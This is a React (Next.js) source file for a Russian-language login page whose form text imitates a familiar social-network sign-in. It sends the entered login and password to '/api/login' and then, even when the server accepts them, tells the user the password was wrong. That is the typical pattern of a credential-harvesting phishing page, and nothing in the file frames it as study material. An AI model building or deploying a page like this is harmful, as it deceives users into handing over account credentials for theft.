"use client";
import { useState } from "react";

export default function Home() {

  const [login, setLogin] = useState("");
  const [password, setPassword] = useState("");
  const [isPassVisible, setIsPassVisible] = useState(false);
  const [message, setMessage] = useState("");

  const handleSubmit = async () => {
    if(login.length < 3 || password.length < 6)
      return;
    
    setMessage("");

    try {
      const response = await fetch('/api/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ login, password }),
      });
  
      const result = await response.json();
  
      if (response.ok) {
        setMessage("Ошибка входа. Проверте свой логин и пароль.")
      } else {
        setMessage(`Ошибка!`);
      }
    } catch (error) {
      setMessage('Произошла ошибка при отправке данных.');
    }
  }

  return (
    <div className="wrapper">
      
      <div className="login-form">
        
        <i></i>
        
        <p>Для продолжения необходима авторизация</p>

        <div className="styled-input">
          {login.length > 0 && ( <label>Телефон, имя пользователя или эл. адрес</label> )}
          
          <div className="input-container"
            style={login.length > 0 ? {justifyContent: "flex-start"} : {justifyContent: "center"}}>
            <input 
              type="text" 
              placeholder="Телефон, имя пользователя или эл. адрес"
              value={login}  
              onChange={(e) => {setLogin(e.target.value)}}/>
          </div>
          
        </div>
        
        <div className="styled-input">
          {password.length > 0 && ( <label>Пароль</label> )}
          
          <div className="input-container"
            style={password.length > 0 ? {justifyContent: "flex-start"} : {justifyContent: "center"}}>
            <input 
              type={isPassVisible ? "text" : "password"}  
              placeholder="Пароль"
              value={password}
              style={{maxWidth: "70%", alignSelf: "flex-start"}}
              onChange={(e) => {setPassword(e.target.value)}}/>
            
            {password.length > 0 && (
              <button onClick={(e) => {
                setIsPassVisible(!isPassVisible);
              }}
                >
                  {isPassVisible ? "Скрыть" : "Показать"}
              </button>
            )}
            
          </div>
          
        </div>
        
        
        <button
          style={
            (login.length > 0 &&
            password.length >= 6) ? 
            {opacity: "1"} : 
            {opacity: ".7"} 
          }
          onClick={handleSubmit}
        >
          Войти
        </button>

        {message.length > 0 && (
          <div className="message">
            <p>К сожалению, вы ввели неправильный пароль. Проверьте свой пароль еще раз.</p>
          </div>
        )}
        

      </div>

    </div>
  );
}
